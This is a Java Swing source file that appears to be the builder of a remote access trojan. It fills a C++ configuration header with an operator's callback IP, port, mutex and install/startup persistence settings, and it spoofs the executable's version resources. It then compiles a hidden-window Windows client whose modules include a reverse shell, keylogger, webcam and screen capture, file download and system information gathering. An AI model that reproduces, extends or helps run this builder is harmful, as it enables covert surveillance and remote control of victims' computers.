package GUI.Compiler;

import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import java.io.File;
import java.io.IOException;

import java.nio.file.Path;
import java.util.concurrent.atomic.AtomicReference;

public class Compiler implements ActionListener {

    private final JDialog compilerDialog;
    private final JCheckBox[] checkBoxes;
    private final JTextField[] fieldsArray;
    private final ButtonGroup buttonGroup;

    public static Path localClientFiles;

    private Path assemblyPath;

    public Compiler(JDialog compilerDialog, JCheckBox[] checkBoxesArray, JTextField[] fieldsArray, ButtonGroup buttonGroup) {
        this.compilerDialog = compilerDialog;
        this.checkBoxes = checkBoxesArray;
        this.fieldsArray = fieldsArray;
        this.buttonGroup = buttonGroup;


    }

    // Creating command line for compiling with g++, several options to include on the client
    @Override
    public void actionPerformed(ActionEvent e) {
        assemblyPath = Path.of(localClientFiles.toString(), "compile_configuration");
        // File chooser where to save file
        final StringBuilder command = new StringBuilder();
        JFileChooser chooser = new JFileChooser();
        chooser.setFileFilter(new FileNameExtensionFilter(".exe", "."));
        chooser.setCurrentDirectory(new File(System.getProperty("user.dir")));
        chooser.setSelectedFile(new File("client"));
        chooser.setAcceptAllFileFilterUsed(false);
        int returnVal = chooser.showSaveDialog(compilerDialog);
        CPPModifier modifier = new CPPModifier(Path.of(localClientFiles.toString(), "configuration.h").toString());
        if (returnVal == JFileChooser.APPROVE_OPTION) {
            setAssemblySettings();
            // Set IP
            modifier.variableModifier("IP", "\"" + fieldsArray[0].getText() + "\"");
            // Set PORT
            modifier.variableModifier("PORT", fieldsArray[1].getText());
            // Set tag name
            modifier.variableModifier("TAG_NAME", "\"" + fieldsArray[2].getText() + "\"");
            // Set mutex
            modifier.variableModifier("MUTEX", "\"" + fieldsArray[3].getText() + "\"");
            // Set timing
            modifier.variableModifier("TIMING_RETRY", fieldsArray[4].getText());
            // Create command line
            String utilities = fieldsArray[5].getText();
            String pathOfUtilities = "";
            if (!utilities.equals("g++ / windres")) pathOfUtilities = utilities;
            String assemblyCommand = Path.of(pathOfUtilities, "windres") + " assembly.rc compiled_assembly.opc";
            command.append(Path.of(pathOfUtilities, "g++")).append(" compile_configuration/compiled_assembly.opc client.cpp " +
                    "video_audio/DeviceEnumerator.cpp " +
                    "stream/Stream.cpp  " +
                    "time/Time.cpp  converter/Converter.cpp " +
                    "download/Download.cpp " +
                    "file/FileManager.cpp  " +
                    "information/system/SystemInformation.cpp  " +
                    "information/network/NetworkInformation.cpp " +
                    "reverse_shell/ReverseShell.cpp " +
                    "keyboard/KeyboardExecuter.cpp " +
                    "permission/Permission.cpp " +
                    "box_message/MessageBoxGUI.cpp " +
                    "state/SystemState.cpp " +
                    "install/Install.cpp " +
                    "sender/Sender.cpp ");
            // check if installation needs to be make
            if (checkBoxes[0].isSelected()) {
                modifier.variableModifier("INSTALL_PATH", buttonGroup.getSelection().getActionCommand());
                modifier.variableModifier("SUBDIRECTORY_NAME", "\"" + fieldsArray[6].getText() + "\"");
                modifier.variableModifier("SUBDIRECTORY_FILE_NAME", "\"" + fieldsArray[7].getText() + ".exe" + "\"");
                modifier.variableModifier("STARTUP_NAME", checkBoxes[1].isSelected() ? "\"" + fieldsArray[8].getText() + "\"" : "\"\"");
            } else {
                modifier.variableModifier("INSTALL_PATH", "(-1)");
            }
            if (checkBoxes[3].isSelected()) {
                modifier.addInclude("#define KEYLOGGER");
                modifier.variableModifier("KEYLOGGER", "\"" + fieldsArray[10].getText() + "\"");
                command.append("keylogger/KeyLogger.cpp ");
            } else modifier.removeInclude("#define KEYLOGGER");
            if (checkBoxes[2].isSelected()) {
                modifier.addInclude("#define WEBCAM");
                modifier.variableModifier("WEBCAM", "\"" + fieldsArray[9].getText() + "\"");
                System.out.println("selected webcam");
                command.append(
                        "screen/ScreenStreamer.cpp " +
                                "webcam/WebcamManager.cpp " +
                                " -IC:opencv_static/include -Lopencv_static/lib " +
                                "-lopencv_gapi460 -lopencv_highgui460 " +
                                "-lopencv_ml460 -lopencv_objdetect460 " +
                                "-lopencv_photo460 -lopencv_stitching460 " +
                                "-lopencv_video460 -lopencv_calib3d460 " +
                                "-lopencv_features2d460 -lopencv_dnn460 " +
                                "-lopencv_flann460 -lopencv_videoio460 " +
                                "-lopencv_imgcodecs460 -lopencv_imgproc460 " +
                                "-lopencv_core460 -llibprotobuf " +
                                "-lade -llibjpeg-turbo -llibwebp " +
                                "-llibpng -llibtiff -llibopenjp2 -lIlmImf " +
                                "-lzlib -lquirc ");
            } else modifier.removeInclude("#define WEBCAM");
            command.append("-lwsock32 -lcomctl32 -lgdi32 " +
                    "-lole32 -lsetupapi -lws2_32  -loleaut32 -luuid" +
                    " -lcomdlg32 -lwininet -static-libgcc " +
                    "-static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -mwindows -o ").append(
                    chooser.getSelectedFile().getAbsolutePath());


            modifier.writeToFile();
            System.out.println(command);
            compile(command.toString(), assemblyCommand);
        }

    }

    // Thread for compiling the project opening shell in client project directory
    private void compile(String compileCommand, String assemblyCommand) {
        new Thread(() -> {
            AtomicReference<CompilingAnimation> animationDialog = new AtomicReference<>();
            SwingUtilities.invokeLater(() -> animationDialog.set(new CompilingAnimation(compilerDialog)));
            String[] OSCommand = VersionChecker.getOSProperCommand();
            ProcessBuilder assemblyProcess = new ProcessBuilder();
            assemblyProcess.command(OSCommand[0], OSCommand[1], assemblyCommand).directory(assemblyPath.toFile());
            int result = executeProcess(assemblyProcess);
            if (result != 0) {
                SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(compilerDialog,
                        "Error assembling client, check for windres and try again.",
                        "Error assembling", JOptionPane.ERROR_MESSAGE));
            }
            ProcessBuilder compileProcess = new ProcessBuilder();
            compileProcess.command(OSCommand[0], OSCommand[1], compileCommand).directory(localClientFiles.toFile());
            result = executeProcess(compileProcess);
            if (result != 0) {
                SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(compilerDialog,
                        "Error compiling client, check your compiler and try again.",
                        "Error compiling", JOptionPane.ERROR_MESSAGE));

            } else SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(
                    compilerDialog,
                    "Client compiled successfully!",
                    "Compiler information",
                    JOptionPane.INFORMATION_MESSAGE));
            SwingUtilities.invokeLater(() -> animationDialog.get().dispose());

        }).start();

    }

    private int executeProcess(ProcessBuilder processBuilder) {
        try {
            Process process = processBuilder.start();
            return process.waitFor();

        } catch (IOException | InterruptedException ex) {
            ex.printStackTrace();
        }
        return -1;

    }

    private void setAssemblySettings(){
        CPPModifier modifier = new CPPModifier(Path.of(assemblyPath.toString(), "assembly.rc").toString());
        modifier.modifyAssemblySettings(
                fieldsArray[11].getText(),
                fieldsArray[12].getText(),
                fieldsArray[13].getText(),
                fieldsArray[14].getText(),
                fieldsArray[15].getText(),
                fieldsArray[16].getText());
        modifier.writeToFile();
    }



}
